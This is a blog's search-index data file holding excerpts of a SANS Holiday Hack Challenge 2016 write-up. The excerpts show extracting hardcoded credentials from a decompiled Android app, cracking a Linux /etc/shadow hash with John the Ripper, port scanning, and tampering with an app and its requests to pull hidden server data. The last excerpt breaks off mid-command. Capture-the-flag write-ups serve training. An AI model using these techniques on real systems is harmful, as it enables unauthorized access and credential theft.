var store = [{
        "title": "SANS Holiday Hack Challenge 2014",
        "excerpt":"Since 2011, the SANS Institute has held a holiday hacking challenge1 that is open to the public. In 2014, I give it a shot and was able to solve all the puzzles and complete a walkthrough explaining how I did it. Here is a direct link to my official write-up in PDF.             http://pen-testing.sans.org/holiday-challenge/2014 &#8617;       ","categories": ["SANS","Holday Hack","writeup"],
        "tags": [],
        "url": "https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-2014/",
        "teaser":"https://www.joshtomkiel.com/assets/images/sans-2014.png"},{
        "title": "Part 1: A Most Curious Business Card",
        "excerpt":"Question 1: What is the secret message in Santa’s tweets? Question 2: What is inside the ZIP file distributed by Santa’s team? In order to answer these questions, you first had to know a little information about Santa.  Luckily, all the information needed was printed on his business card discovered by Josh and Jessica Dosis.  Per the card, Santa is @santawclaus on twitter.  Let’s check out his account.  Discovery of his hidden message required scraping and saving all his tweets.  To do this, I used a free service called twlets.  I was able to export them to an Excel (XLSX) file. An image started to appear in Column E but it wasn’t clear.  This was fixed by changing to a “Fixed Width” font.I chose the appropriately named font “Hack.”  What is the secret message in Santa’s tweets?bugbounty Answering the second question required performing some detective work on Santa’s @santawclaus instagram account. The first picture he uploaded contained the required information to download the ZIP file.  (enhance…) Combining the URL on the paper (1) with the file name on the monitor (2) gave the direct location for the ZIP file.  Grab the ZIP file and extract the contents. josh@MacBook-Pro ~/Downloads $ curl -O www.northpolewonderland.com/SantaGram_v4.2.zip  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100 1917k  100 1917k    0     0  4678k      0 --:--:-- --:--:-- --:--:-- 4687kjosh@MacBook-Pro ~/Downloads $ file SantaGram_v4.2.zipSantaGram_v4.2.zip: Zip archive data, at least v2.0 to extractjosh@MacBook-Pro ~/Downloads $ unzip SantaGram_v4.2.zipArchive:  SantaGram_v4.2.zip[SantaGram_v4.2.zip] SantaGram_4.2.apk password:  inflating: SantaGram_4.2.apkWhat is inside the ZIP file distributed by Santa’s team?SantaGram_4.2.apk (MD5 = bdb7ca46ce95e9652616852d7c1cf127) ","categories": ["SANS","Holday Hack","writeup"],
        "tags": [],
        "url": "https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt1-2016/",
        "teaser":"https://www.joshtomkiel.com/assets/images/sans-2016.png"},{
        "title": "Part 2: Awesome Package Konveyance",
        "excerpt":"Question 3: What username and password are embedded in the APK file? Question 4: What is the name of the audible component (audio file) in the SantaGram APK file? Now that the APK file has been obtained, the next step is to extract the contents.  To do this, I used apktool to decode the resources within the APK file itself. josh@MacBook-Pro ~/HolidayHack2016 $ java -jar apktool_2.2.1.jar d SantaGram_4.2.apkI: Using Apktool 2.2.1 on SantaGram_4.2.apkI: Loading resource table...I: Decoding AndroidManifest.xml with resources...I: Loading resource table from file: /Users/josh/Library/apktool/framework/1.apkI: Regular manifest package...I: Decoding file-resources...I: Decoding values */* XMLs...I: Baksmaling classes.dex...I: Copying assets and libs...I: Copying unknown files...I: Copying original files...josh@MacBook-Pro ~/HolidayHack2016 $ ls -latotal 18040drwxr-xr-x    5 josh  staff      170 Dec 27 21:07 .drwxr-xr-x+ 116 josh  staff     3944 Dec 27 21:07 ..drwxr-xr-x    8 josh  staff      272 Dec 27 21:07 SantaGram_4.2-rw-r--r--    1 josh  staff  2257390 Dec 27 21:06 SantaGram_4.2.apk-rw-r--r--@   1 josh  staff  6972627 Dec 27 21:07 apktool_2.2.1.jarA new directory was created (SantaGram_4.2) containing all the files extracted from the APK.  I did a case insensitive (-i), recursive (-r), grep command to find text that matches username in the SantaGram_4.2 folder.  Since I don’t know if the username and password will be on the same line, using the -A10 flag will display 10 lines after the match, and -B10 flag will display 10 lines before the match. This will give a little buffer to manually search within. josh@MacBook-Pro ~/HolidayHack2016 $ grep -i -r -A10 -B10 'username' SantaGram_4.2--SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-.end methodSantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-.method public static a(Landroid/content/Context;Ljava/lang/String;)VSantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    .locals 4SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    new-instance v0, Lorg/json/JSONObject;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    invoke-direct {v0}, Lorg/json/JSONObject;-&gt;&lt;init&gt;()VSantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    :try_start_0SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali:    const-string v1, \"username\"SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    const-string v2, \"guest\"SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;-&gt;put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    const-string v1, \"password\"SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    const-string v2, \"busyreindeer78\"SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/b.smali-    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;-&gt;put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;----SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-.end methodSantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-.method private postDeviceAnalyticsData()VSantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    .locals 4SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    new-instance v0, Lorg/json/JSONObject;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    invoke-direct {v0}, Lorg/json/JSONObject;-&gt;&lt;init&gt;()VSantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    :try_start_0SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali:    const-string v1, \"username\"SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    const-string v2, \"guest\"SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;-&gt;put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    const-string v1, \"password\"SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    const-string v2, \"busyreindeer78\"SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-SantaGram_4.2/smali/com/northpolewonderland/santagram/SplashScreen.smali-    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;-&gt;put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;--After manually reviewing the output, it looked like there were matches in 2 different files. Having the extra buffer really helped. Additionally, the URL information for the targets in Part 4 was discovered within the ./SantaGram_4.2/res/values/strings.xml file.  The APK file will be revisted again later on. josh@MacBook-Pro ~/HolidayHack2016 $ cat ./SantaGram_4.2/res/values/strings.xml | grep url    &lt;string name=\"analytics_launch_url\"&gt;https://analytics.northpolewonderland.com/report.php?type=launch&lt;/string&gt;    &lt;string name=\"analytics_usage_url\"&gt;https://analytics.northpolewonderland.com/report.php?type=usage&lt;/string&gt;    &lt;string name=\"banner_ad_url\"&gt;http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5&lt;/string&gt;    &lt;string name=\"debug_data_collection_url\"&gt;http://dev.northpolewonderland.com/index.php&lt;/string&gt;    &lt;string name=\"dungeon_url\"&gt;http://dungeon.northpolewonderland.com/&lt;/string&gt;    &lt;string name=\"exhandler_url\"&gt;http://ex.northpolewonderland.com/exception.php&lt;/string&gt;Question 3: What username and password are embedded in the APK file?             Location      File Name      Username      Password                  ./SantaGram_4.2/smali/com/northpolewonderland/santagram/      b.smali      guest      busyreindeer78              ./SantaGram_4.2/smali/com/northpolewonderland/santagram/      SplashScreen.smali      guest      busyreindeer78      Using another grep command, we’ll be able to find the audio file too.  When I think of audio formats, MP3 is arguably the most popular format, so let’s see if there are any MP3 files in the extracted SantaGram_4.2 directory. josh@MacBook-Pro ~/HolidayHack2016 $ grep -ir 'mp3' SantaGram_4.2SantaGram_4.2/original/META-INF/CERT.SF:Name: res/raw/discombobulatedaudio1.mp3SantaGram_4.2/original/META-INF/MANIFEST.MF:Name: res/raw/discombobulatedaudio1.mp3There you have it.  The location of the first audio file flag has been discovered. Question 4: What is the name of the audible component (audio file) in the SantaGram APK file?             Location      File Name      MD5                  ./SantaGram_4.2/res/raw/      discombobulatedaudio1.mp3      b7aca2f218c39b997bfd61b83856aed2      ","categories": ["SANS","Holday Hack","writeup"],
        "tags": [],
        "url": "https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt2-2016/",
        "teaser":"https://www.joshtomkiel.com/assets/images/sans-2016.png"},{
        "title": "Part 3: A Fresh-Baked Holiday Pi",
        "excerpt":"Question 5: What is the password for the ‘cranpi’ account on the Cranberry Pi system? Question 6: How did you open each terminal door and where had the villain imprisoned Santa? After gathering all the pieces to the Cranberry Pi system from the North Pole (a Quest objective), you are given a link to a ZIP file containing a “Cranbian” image. For this section, I transferred the cranbian.img.zip file over to a Kali Linux virtual machine and continued there. The SANS blog post titled Mount a Raspberry Pi File System Image walks you through the steps needed to get going. However, I’ll still show the exact commands I used. Extracting the image… root@gh0st1:/# unzip cranbian.img.zip Archive:  cranbian.img.zip  inflating: cranbian-jessie.imgUsing fdisk to get important information about the image (partition and sector sizes/types/offsets)… root@gh0st1:/# fdisk -l cranbian-jessie.imgDisk cranbian-jessie.img: 1.3 GiB, 1389363200 bytes, 2713600 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0x5a7089a1Device               Boot  Start     End Sectors  Size Id Typecranbian-jessie.img1        8192  137215  129024   63M  c W95 FAT32 (LBA)cranbian-jessie.img2      137216 2713599 2576384  1.2G 83 LinuxBased on the fdisk output, cranbian-jessie.img2 is our primary target.  It’s the largest partition (1.2G) and uses the Linux file system. Before mounting it, I need to know where the file system begins.  This is done by multiplying the sector size (512 bytes) and the start sector for the Linux file system (137216) I come up with the total file system size in bytes (70254592). root@gh0st1:/# echo $((512*137216))70254592Now to make a directory to mount the image… root@gh0st1:/# mkdir /root/cranbianMounting the image to that directory… root@gh0st1:/# mount -v -o offset=70254592 -t ext4 /cranbian-jessie.img /root/cranbianmount: /dev/loop1 mounted on /root/cranbian.You can navigate the directory structure as you would normally. root@gh0st1:/# cd /root/cranbian/root@gh0st1:~/cranbian# ls -latotal 132drwxr-xr-x 21 root root 36864 Dec  5 16:09 .drwxr-xr-x 33 root root  4096 Dec 20 05:01 ..drwxr-xr-x  2 root root  4096 Nov 23 10:11 bindrwxr-xr-x  2 root root  4096 Sep 22 23:52 bootdrwxr-xr-x  4 root root  4096 Sep 22 22:23 devdrwxr-xr-x 77 root root  4096 Dec  5 11:25 etcdrwxr-xr-x  3 root root  4096 Nov 21 10:25 homedrwxr-xr-x 17 root root  4096 Nov 23 10:07 libdrwx------  2 root root 16384 Sep 22 23:52 lost+founddrwxr-xr-x  2 root root  4096 Sep 22 22:20 mediadrwxr-xr-x  2 root root  4096 Sep 22 22:20 mntdrwxr-xr-x  3 root root  4096 Sep 22 22:27 optdrwxr-xr-x  2 root root  4096 Jan  6  2015 procdrwx------  2 root root  4096 Nov 23 10:14 rootdrwxr-xr-x  5 root root  4096 Sep 22 22:28 rundrwxr-xr-x  2 root root  4096 Sep 22 22:39 sbindrwxr-xr-x  2 root root  4096 Sep 22 22:20 srvdrwxr-xr-x  2 root root  4096 Apr 12  2015 sysdrwxrwxrwt  7 root root  4096 Nov 17 15:17 tmpdrwxr-xr-x 10 root root  4096 Sep 22 22:20 usrdrwxr-xr-x 11 root root  4096 Nov 23 10:10 varroot@gh0st1:~/cranbian# To crack the password of a local Linux account with john you’ll need two things, the /etc/shadow file and the /etc/passwd file.  The unshadow tool combines the passwd and shadow files so john can attempt to crack them against a wordlist.  Both unshadow and john are distributed with John the Ripper which comes preconfigured in Kali.  Since I had access to the Cranbian file system now, the rest is pretty straightforward. Running unshadow without any parameters will tell you what it is looking for. root@gh0st1:~/# unshadow Usage: unshadow PASSWORD-FILE SHADOW-FILESpecify the file locations… root@gh0st1:~/# unshadow /root/cranbian/etc/passwd /root/cranbian/etc/shadowroot:*:0:0:root:/root:/bin/bashdaemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:*:2:2:bin:/bin:/usr/sbin/nologinsys:*:3:3:sys:/dev:/usr/sbin/nologinsync:*:4:65534:sync:/bin:/bin/syncgames:*:5:60:games:/usr/games:/usr/sbin/nologinman:*:6:12:man:/var/cache/man:/usr/sbin/nologinlp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:*:8:8:mail:/var/mail:/usr/sbin/nologinnews:*:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:*:13:13:proxy:/bin:/usr/sbin/nologinwww-data:*:33:33:www-data:/var/www:/usr/sbin/nologinbackup:*:34:34:backup:/var/backups:/usr/sbin/nologinlist:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:*:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:*:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:*:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:*:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/falsemessagebus:*:104:109::/var/run/dbus:/bin/falseavahi:*:105:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/falsentp:*:106:111::/home/ntp:/bin/falsesshd:*:107:65534::/var/run/sshd:/usr/sbin/nologinstatd:*:108:65534::/var/lib/nfs:/bin/falsecranpi:$6$2AXLbEoG$zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:1000:1000:,,,:/home/cranpi:/bin/bashThere is the output above.  This time I will save it to a text file. root@gh0st1:~/# unshadow /root/cranbian/etc/passwd /root/cranbian/etc/shadow &gt; /root/unshadow.txtThanks to tips received from talking with the elves during the Quest, the popular rockyou.txt wordlist will be used to attempt to crack the password. root@gh0st1:~/# john /root/unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txtWarning: detected hash type \"sha512crypt\", but the string is also recognized as \"crypt\"Use the \"--format=crypt\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])Press 'q' or Ctrl-C to abort, almost any other key for status0g 0:00:05:06 0.94% (ETA: 03:17:10) 0g/s 519.9p/s 519.9c/s 519.9C/s ilovedogs2..hustlers0g 0:00:05:18 0.98% (ETA: 03:15:48) 0g/s 521.2p/s 521.2c/s 521.2C/s tony89..tina1010g 0:00:05:19 0.98% (ETA: 03:15:30) 0g/s 521.4p/s 521.4c/s 521.4C/s spiky..solveig0g 0:00:09:37 1.83% (ETA: 02:57:38) 0g/s 532.7p/s 532.7c/s 532.7C/s hateall..harley1430g 0:00:10:14 1.95% (ETA: 02:56:13) 0g/s 534.1p/s 534.1c/s 534.1C/s zablan..yuhuu0g 0:00:10:15 1.96% (ETA: 02:56:09) 0g/s 534.2p/s 534.2c/s 534.2C/s woodpony..winx clubyummycookies     (cranpi)1g 0:00:14:24 DONE (2016-12-11 18:26) 0.001156g/s 525.2p/s 525.2c/s 525.2C/s yveth..yulyulUse the \"--show\" option to display all of the cracked passwords reliablySession completedAfter about 14 minutes in my VM with 2GB of RAM, the password was discovered. Question 5: What is the password for the ‘cranpi’ account on the Cranberry Pi system?yummycookies Question 6: How did you open each terminal door and where had the villain imprisoned Santa?This feature was so awesome, it deserved a separate section in my write-up.  See the terminals section for answers to each challenge.  As for Santa, he was imprisoned in his very own Dungeon For Errant Reindeer (DFER), but he had no memory of what happened or who had imprisoned him.  Finding him required beating the OUTATIME Challenge and traveling back in time to 1978. ","categories": ["SANS","Holday Hack","writeup"],
        "tags": [],
        "url": "https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt3-2016/",
        "teaser":"https://www.joshtomkiel.com/assets/images/sans-2016.png"},{
        "title": "Part 4: My Gosh... It's Full of Holes",
        "excerpt":"Question 7: ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN AT THE NORTH POLE, ATTEMPT TO REMOTELY EXPLOIT EACH OF THE FOLLOWING TARGETS… For each of those six items, which vulnerabilities did you discover and exploit? Question 8: What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.) Below is the list of the six (6) vulnerable servers to target. Each hosting a hidden ‘discombobulatedaudio’ MP3 file.             Target      IP Address      DNS                  The Mobile Analytics Server (via credentialed login access)      104.198.252.157      analytics.northpolewonderland.com              The Mobile Analytics Server (post authentication)      104.198.252.157      analytics.northpolewonderland.com              The Dungeon Game      35.184.47.139      dungeon.northpolewonderland.com              The Debug Server      35.184.63.245      dev.northpolewonderland.com              The Banner Ad Server      104.198.221.240      ads.northpolewonderland.com              The Uncaught Exception Handler Server      104.154.196.33      ex.northpolewonderland.com      All target servers were discovered within the same file inside the SantaGram APK file. The Dungeon Game One of the elves (Pepper Minstix) provides a link to an offline version of the game ‘Dungeon’.  A text based adventure game created at the Programming Technology Division of the MIT Laboratory for Computer Science.  It also goes by the name ‘Zork’. Extracting the ZIP file reveals two (2) files.   Linux ELF executable (dungeon)  DAT file (dtextc.dat)After some research, it seemed that all the good stuff was stored in the DAT file.  Running strings didn’t turn up anything useful on either file.  A Google search revealed that there was a way to decode the dtextc.dat file. http://web.mit.edu/jhawk/src/cdungeon-decode.c josh@MacBook-Pro ~/Downloads $ curl -O http://web.mit.edu/jhawk/src/cdungeon-decode.c  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100 70303  100 70303    0     0  69473      0  0:00:01  0:00:01 --:--:-- 69538josh@MacBook-Pro ~/Downloads $ gcc cdungeon-decode.c -o cdungeon-decode  # A few warnings were generated but it still compiled.Running the decode script… josh@MacBook-Pro ~/Downloads $ ./cdungeon-decodeCopyright (c) Ian Lance Taylor 1991 &lt;ian@airs.com&gt;Usage: data -[aobn] [inputfile(s)] -[aobns] [outputfile(s)]       -a ASCII (readable) format; one file          input default stdin, output default stdout       -o old (f77) format; index file, text file          input default library files, output default local files       -b new compressed binary format; one file          input default library file, output default local file       -n is a synonym for -b       -s creates a sequential file (Alpha Micro only)Feeding it the .dat file and specifying the output text file… josh@MacBook-Pro ~/Downloads $ ./cdungeon-decode -n dungeon/dtextc.dat -a dungeon/dtextc.txtSearching for the text elf within the new text file… josh@MacBook-Pro ~/Downloads $ cat dungeon/dtextc.txt | grep -i -A1 -B1 'elf'&lt;!--OUTPUT TRUNCATED--&gt;Message: 1023 The elf, willing to bargain, says \"What's in it for me?\"Message: 1024----Message: 1024 The elf, satisified with the trade says - Try the online version for the true prize----Message: 1026 The elf appears increasingly impatient.Message: 1027----Message: 1027 The elf says - you have conquered this challenge - the game will now end.Looks like Message: 1024 would hold the information needed, but it says to “try the online version.”  There is also a Debug Mode (GDT) for this game per http://gunkies.org/wiki/Zork_hints.  Using the GDT mode can take me right to the message I want to see using the TD command to ‘Display Text’. Time to see what ports are open on this host.  A quick nmap scan with service detection (-sV) hitting all TCP ports (-p-) should tell us more. Out of habit, I also save the results locally (-oA). This saves the output in the three major formats (.xml, .gnmap, and .nmap) at once. josh@MacBook-Pro ~/Downloads $ nmap -sV -p- dungeon.northpolewonderland.com -oA dungeon.northpolewonderland.comStarting Nmap 7.31 ( https://nmap.org ) at 2016-12-24 12:24 ESTNmap scan report for dungeon.northpolewonderland.com (35.184.47.139)Host is up (0.047s latency).rDNS record for 35.184.47.139: 139.47.184.35.bc.googleusercontent.comNot shown: 65531 closed portsPORT      STATE    SERVICE    VERSION22/tcp    open     ssh        OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)25/tcp    filtered smtp80/tcp    open     http       nginx 1.6.211111/tcp open     tcpwrappedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 30.91 secondsTCP 11111 looks interesting.  Let’s netcat to that port. josh@MacBook-Pro ~/Downloads/dungeon $ nc dungeon.northpolewonderland.com 11111Welcome to Dungeon.\t\t\tThis version created 11-MAR-78.You are in an open field west of a big white house with a boardedfront door.There is a small wrapped mailbox here.&gt;GDT   GDT&gt;DTEntry:    1024The elf, satisified with the trade says -send email to \"peppermint@northpolewonderland.com\" for that which you seek.Next, I sent an e-mail off to peppermint@northpolewonderland.com and moments later, receive the following automated response…    The Dungeon Game challenge is complete! The Banner Ad Server At first glance, http://ads.northpolewonderland.com seems to be a basic webpage without much going on.  Viewing the page source discloses that the site is using Meteor release version METEOR@1.4.2.3,  which was released on November 17, 2016 according to the GitHub release timeline.  Luckily, there was a recent SANS blog post titled Mining Meteor.  Following the guidance in that post, I installed the TamperMonkey add-on in Firefox and setup the MeteorMiner script to help visualize the active subscriptions and the collections for Meteor. Firefox’s browser developer tools (specifically the web console) will help with this challenge tremendously. Now that the TamperMonkey with the MeteorMiner script was active, I’ll load the page again.  The default pages shows 4 records under HomeQuotes under Collections (1).  It’s also worth noting that the MeteorMiner script helps identify pages that would not have been accessible otherwise. The pages were listed under Routes.  Click the arrow to the right of /admin/quotes (1) and that will take you to the /admin/quotes page. While there may not be anything useful displayed on the page, a new record appeared within the HomeQuotes (2) section under Collections.  To see everything that’s included within adminQuotes, open the Firefox web console (from the keyboard: press Ctrl+Shift+K or Cmd+Option+K on a Mac) With the web console open, type HomeQuotes.find().fetch() then press enter to display all the objects (1).  Click on the fifth object (2) to see the link to the the audio file (3).  Thanks to MeteorMiner, the collections information was visible and I knew exactly what to query from within the Firefox web console. http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3   Banner Ad Server complete! The Debug Server Completing the Debug Server challenge required changing the APK file.  By default, debug mode on the StantaGram app is disabled.  In Part 2, I covered how to extract an APK file with apktool. I’ll pick up from already having the SantaGram app decompiled. Let’s do a case insensitive (-i), recursive (-r), grep command to see where the word debug appears in any files within the StantaGram_4.2 directory… josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i -r \"debug\" ../res/values/public.xml:    &lt;public type=\"string\" name=\"debug_data_collection_url\" id=\"0x7f07001d\" /&gt;./res/values/public.xml:    &lt;public type=\"string\" name=\"debug_data_enabled\" id=\"0x7f07001e\" /&gt;./res/values/strings.xml:    &lt;string name=\"debug_data_collection_url\"&gt;http://dev.northpolewonderland.com/index.php&lt;/string&gt;./res/values/strings.xml:    &lt;string name=\"debug_data_enabled\"&gt;false&lt;/string&gt;./smali/android/support/v7/view/menu/h.smali:    .annotation runtime Landroid/view/ViewDebug$CapturedViewProperty;./smali/android/support/v7/view/menu/h.smali:    .annotation runtime Landroid/view/ViewDebug$CapturedViewProperty;./smali/android/support/v7/widget/ActionMenuView$c.smali:    .annotation runtime Landroid/view/ViewDebug$ExportedProperty;./smali/android/support/v7/widget/ActionMenuView$c.smali:    .annotation runtime Landroid/view/ViewDebug$ExportedProperty;./smali/android/support/v7/widget/ActionMenuView$c.smali:    .annotation runtime Landroid/view/ViewDebug$ExportedProperty;./smali/android/support/v7/widget/ActionMenuView$c.smali:    .annotation runtime Landroid/view/ViewDebug$ExportedProperty;./smali/android/support/v7/widget/ActionMenuView$c.smali:    .annotation runtime Landroid/view/ViewDebug$ExportedProperty;./smali/com/northpolewonderland/santagram/b.smali:    invoke-static {}, Landroid/os/Debug;-&gt;getNativeHeapAllocatedSize()J./smali/com/northpolewonderland/santagram/EditProfile.smali:    const-string v3, \"Remote debug logging is Enabled\"./smali/com/northpolewonderland/santagram/EditProfile.smali:    const-string v1, \"debug\"./smali/com/northpolewonderland/santagram/EditProfile.smali:    const-string v3, \"Remote debug logging is Disabled\"./smali/com/northpolewonderland/santagram/EditProfile.smali:    const-string v3, \"Error posting JSON debug data: \"./smali/com/northpolewonderland/santagram/SplashScreen.smali:    invoke-static {}, Landroid/os/Debug;-&gt;getNativeHeapAllocatedSize()J./smali/com/parse/Parse.smali:.field public static final LOG_LEVEL_DEBUG:I = 0x3Of all the matches, the file ./res/values/strings.xml looked promising.  The file was edited to change the debug_data_enabled=false to true. It’s worth noting that the EditProfile.smali appears to check if debug mode is enabled or not.  Time to change the file, rebuild, then upload to the emulator. The APK rebuild process is covered very well in the Manipulating Android Applications video.  Watch this to understand how to setup your environment and how to sign the APK file. I also installed the Burp proxy certificate on the Android emulator.  To do this, follow the steps in this post from the PortSwigger support forum. I wrote a quick bash script to automate the process of removing the APK from the emulator, building a new version, signing it, and reinstalling. josh@MacBook-Pro ~/HolidayHack2016 $ cat quick_apk.sh#!/bin/bashecho [*] Uninstalling APK## Uninstall'/Users/josh/Library/Android/sdk/platform-tools/adb' uninstall com.northpolewonderland.santagramecho [*] Building new APK## Build New APKjava -jar '/Users/josh/HolidayHack2016/apktool_2.2.1.jar' b SantaGram_4.2echo [*] Signing new APK## Sign New APK'/Applications/Android Studio.app/Contents/jre/jdk/Contents/Home/bin/jarsigner' -sigalg SHA1withRSA -digestalg SHA1 -keystore /Users/josh/HolidayHack2016/keys/SantaGram.keystore /Users/josh/HolidayHack2016/SantaGram_4.2/dist/SantaGram_4.2.apk SantaGramsleep 1echo [*] Installing new APK## Install New APK'/Users/josh/Library/Android/sdk/platform-tools/adb' install /Users/josh/HolidayHack2016/SantaGram_4.2/dist/SantaGram_4.2.apkecho [!] CompleteThe updated APK with the modified strings.xml file has been loaded into the emulator.  Time to login to the app and visit the Edit Profile section.  Burp shows a POST request sent to http://dev.northpolewonderland.com after entering the Edit Profile section.  Let’s select that request and send it to repeater to play with the JSON parameters.  The image above shows the original request and response.  The response includes \"verbose\":false, what if \"verbose\":true was included in the request?  Look at that. Because the information being sent from the client (me) is not validated server side, I am able to view the verbose information which includes the debug audio file.  Ideally, if sensitive information is included in the verbose response, only approved specified users should be able to successfully request that information. josh@MacBook-Pro ~/HolidayHack2016 $ curl -O http://dev.northpolewonderland.com/debug-20161224235959-0.mp3  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  212k  100  212k    0     0   743k      0 --:--:-- --:--:-- --:--:--  744kjosh@MacBook-Pro ~/HolidayHack2016 $ file debug-20161224235959-0.mp3debug-20161224235959-0.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo  The Debug Server is complete! The Uncaught Exception Handler Server Much like in the previous Debug Server challenge, finding the audio file within the Uncaught Exception Handler Server required going back into the SantaGram APK decompiled folder and making modifications to the source code of the app.  Most apps do not trigger exceptions (crashes) when using the app normally (at least you hope not). Let’s make sure this app triggers an exception and watch what happens. In Part 2, I covered how to extract an APK file with apktool. I’ll pick up from already having the SantaGram app decompiled. I already know from the Debug Server challenge that the EditProfile.smali file is called when pressing the Edit Profile button.  With this information, it is possible to tweak that file causing a targeted exception when the Edit Profile button is pressed. josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i \"exception\" ./smali/com/northpolewonderland/santagram/EditProfile.smali    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0    move-exception v1    invoke-virtual {v1}, Ljava/io/IOException;-&gt;printStackTrace()V    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0    move-exception v0    invoke-virtual {v0}, Ljava/lang/Exception;-&gt;getMessage()Ljava/lang/String;A quick grep for the word exception within the EditProfile.smali file has some hits. josh@MacBook-Pro ~/HolidayHack2016/SantaGram_4.2 $ grep -i \"exception\" ./smali/com/northpolewonderland/santagram/EditProfile.smali    .catch 